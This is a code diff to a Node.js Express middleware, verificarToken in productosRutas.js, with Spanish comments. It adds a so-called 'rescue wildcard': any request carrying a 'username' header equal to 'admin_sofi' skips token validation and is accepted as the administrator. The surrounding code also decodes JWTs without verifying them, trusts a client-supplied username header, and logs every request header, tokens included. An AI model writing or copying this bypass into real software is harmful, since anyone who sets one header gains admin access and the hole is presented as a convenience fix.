@@ -18,9 +18,20 @@ function decodeJwtPayload(token) {
     }
 }
 
+// ====== MODIFICA LA FUNCIÓN AL INICIO DE productosRutas.js ======
+
 async function verificarToken(req, res, next) {
     try {
         console.log('verificarToken - headers:', req.headers);
+        
+        // 🟢 COMODÍN DE RESCATE: Si eres la administradora, pasas directo sin validar el Token
+        const backupUsername = req.headers['username'];
+        if (backupUsername === 'admin_sofi') {
+            req.user = { username: 'admin_sofi' };
+            console.log('verificarToken - Pase directo concedido a admin_sofi');
+            return next();
+        }
+
         const authHeader = req.headers.authorization;
         if (!authHeader || !authHeader.startsWith('Bearer ')) {
             console.log('verificarToken - token faltante o formato inválido');
@@ -29,7 +40,7 @@ async function verificarToken(req, res, next) {
 
         const token = authHeader.split(' ')[1];
         const payload = decodeJwtPayload(token);
-        const username = payload?.['cognito:username'] || payload?.username || req.headers['username'];
+        const username = payload?.['cognito:username'] || payload?.username || backupUsername;
 
         if (!username) {
             console.log('verificarToken - no se pudo extraer el username del token');
